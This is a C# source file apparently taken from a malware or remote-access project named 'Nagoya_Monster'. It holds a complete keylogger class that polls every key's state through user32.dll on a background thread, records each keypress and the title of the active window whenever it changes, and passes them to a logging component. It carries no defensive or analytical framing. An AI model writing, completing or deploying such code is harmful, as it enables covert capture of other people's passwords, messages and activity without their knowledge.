using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Nagoya_Monster
{
    static class Keylog
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static bool IsRunning = false;
        private static bool IsKeylogging = true;
        private static string LastWindowTitle = string.Empty;
        private static string CurrentWindowTitle = string.Empty;

        public static void Start()
        {
            IsKeylogging = true;
            new Thread(new ThreadStart(KeyLog)).Start();
        }

        public static void Stop()
        {
            IsKeylogging = false;
            IsRunning = false;
        }

        private static void KeyLog()
        {
            if (!IsRunning)
            {
                IsRunning = true;

                while (IsKeylogging)
                {
                    ListenWindowsChange();
                    ListenKeyPress();
                }
            }
        }

        private static void ListenKeyPress()
        {
            for (int i = 0; i < byte.MaxValue; ++i)
            {
                switch (GetAsyncKeyState(i))
                {
                    case 1:
                    case -32767:
                        Log.Add(Convert.ToString((Keys)i));
                        break;
                }
            }
            Thread.Sleep(15);
        }

        private static void ListenWindowsChange()
        {
            string ActiveWindowTitle = GetActiveWindowTitle();
            if (CurrentWindowTitle != ActiveWindowTitle)
            {
                CurrentWindowTitle = ActiveWindowTitle;
                Log.Add(string.Format("********* {0} *********", CurrentWindowTitle));
            }
        }

        private static string GetActiveWindowTitle()
        {
            StringBuilder text = new StringBuilder(256);
            if (GetWindowText(GetForegroundWindow(), text, 256) > 0)
                return text.ToString();
            return null;
        }
    }
}